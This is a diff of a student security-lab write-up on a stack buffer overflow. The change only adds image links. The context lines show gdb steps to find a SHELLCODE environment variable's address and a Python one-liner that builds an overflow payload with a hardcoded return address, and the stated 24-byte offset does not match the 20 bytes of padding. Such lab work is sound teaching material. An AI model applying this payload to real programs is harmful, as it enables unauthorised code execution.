@@ -85,7 +85,7 @@ Description text (optional)
 **Step 3: Determine the Buffer Overflow Point**
 - Stack frame
 
-    ![task1_1]()
+    ![task1_1](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Lab1/img/task1_1.png)
 
 - From the stack frame, we can see that the return address is located 24 bytes after the start of the buffer. Therefore, we will need to overflow the buffer with 20 bytes of junk and then overwrite the return address with the address of our shellcode (4 bytes).
 
@@ -101,7 +101,7 @@ Description text (optional)
     - Disassemble the main function: `disas main`
     - Run the function and then search for the environment variable's address using: `print getenv("SHELLCODE")`
      
-        ![task1_2]()
+        ![task1_2](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Lab1/img/task1_2.png)
 
 - Next, construct the payload using a Python script:<br>
     `python -c 'print "A"*20 + "\xb8\xdf\xff\xff"' > payload`
